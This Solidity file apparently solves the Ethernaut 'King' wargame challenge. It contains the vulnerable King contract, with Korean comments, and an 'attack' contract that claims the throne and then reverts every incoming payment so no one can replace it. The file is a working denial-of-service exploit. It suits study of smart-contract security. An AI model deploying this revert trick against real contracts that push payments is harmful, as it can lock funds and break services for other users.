// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;  // 나
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);  // 나 한테 돈 보내기
    king = msg.sender;  // 나
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract attack {
    address public owner;

    constructor() public
    {
        owner = msg.sender;
    }

    function atk(address payable asd) public
    {
        asd.call{value: 2000000000000000}("");
    }

    receive() external payable
    {
        if(msg.sender != owner)
        {
            revert();
        }
    }
}